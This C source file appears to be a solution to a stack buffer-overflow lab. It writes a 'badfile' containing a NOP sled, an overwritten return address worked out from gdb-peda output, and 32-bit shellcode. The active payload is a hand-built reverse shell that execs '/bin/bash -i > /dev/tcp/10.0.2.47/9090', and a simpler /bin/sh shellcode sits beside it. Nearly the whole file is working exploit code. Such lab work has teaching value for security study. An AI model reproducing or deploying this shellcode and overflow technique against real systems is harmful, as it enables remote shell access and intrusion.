/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

 /*

 Goal:
 execve("/bin/bash" address, arr[] address, 0)
 >> arr -- {/bin/bash, -c, /bin/bash -i > /dev/tcp/10.0.2.47/9090 0<&1 2>&1}

 */


const char reverse_shellcode_32[] = 
 
 // /bin/bash string

 "\x31\xc0"			/* xorl %eax,%eax */
 "\xb8\xff\xff\xff\x68"		/* movl $0x68ffffff, %eax */
 "\xc1\xe8\x18"			/* shr $0x18,%eax */
 "\x50"				/* pushl %eax */
 
 "\x68""/bas"			/* pushl "/bas" */
 "\x68""/bin"			/* pushl "/bin" */

 /////// execve arg 1 
 "\x89\xe3" 			/* movl %esp, %ebx */
 
 // -c string

 "\x31\xc0"			/* xorl %eax,%eax */
 "\xb8\xff\xff\x2d\x63"		/* movl $0x2d63ffff, %eax */
 "\xc1\xe8\x10"			/* shr $0x10, %eax */
 "\x50"				/* pushl %eax */
 "\x89\xe0"			/* movl %esp, %eax */
 
 // reverse shell string

 "\x31\xd2"			/* xorl %edx,%edx */
 "\x52"				/* pushl %edx */
 "\x68""2>&1"			/* pushl "2>&1" */
 "\x68""<&1 "			/* pushl "<&1 " */
 "\x68""90 0"			/* pushl "90 0" */
 "\x68""7/90"			/* pushl "7/90" */
 "\x68"".2.4"			/* pushl ".2.4" */
 "\x68""10.0"			/* pushl "10.0" */
 "\x68""tcp/"			/* pushl "tcp/" */
 "\x68""dev/"			/* pushl "dev/" */
 "\x68"" > /"			/* pushl " > /" */
 "\x68""h -i"			/* pushl "h -i" */
 "\x68""/bas"			/* pushl "/bas" */
 "\x68""/bin"			/* pushl "/bin" */
 "\x89\xe2"			/* movl %esp,%edx */

 // execve arg 2 (array)

 "\x31\xc9"			/* xorl %ecx,%ecx */
 "\x51"				/* pushl %ecx */
 "\x52"				/* pushl %edx */
 "\x50"				/* pushl %eax */
 "\x53"				/* pushl %ebx */
 "\x89\xe1"			/* movl %esp,%ecx */

 // execve arg 3

 "\x31\xd2"			/* xorl %edx,%edx */

 // system call num

 "\x31\xc0"			/* xorl %eax,%eax */
 "\xb0\x0b"             	/* movb $0x0b,%al */
 "\xcd\x80"             	/* int  $0x80 */
;

/*////////////////

gdb-peda$ p $ebp
$1 = (void *) 0xbfffe6a8
gdb-peda$ p &buffer
$2 = (char (*)[200]) 0xbfffe5d8
gdb-peda$ p 0xbfffe6a8 - 0xbfffe5d8
$3 = 0xd0

*/////////////////

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 
    // *((long *) (buffer + 208 + 4)) = 0xbfffe6a8 + 120;

    // Buffer address 0xbff622d8
    // *((long *) (buffer + 208 + 4)) = 0xbfffe6a8 + 120;
    *((long *) (buffer + 208 + 4)) = 0xbfffede8 + 208 + 4 + 120;

   memcpy(buffer + sizeof(buffer) - sizeof(reverse_shellcode_32), reverse_shellcode_32,
        sizeof(reverse_shellcode_32));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
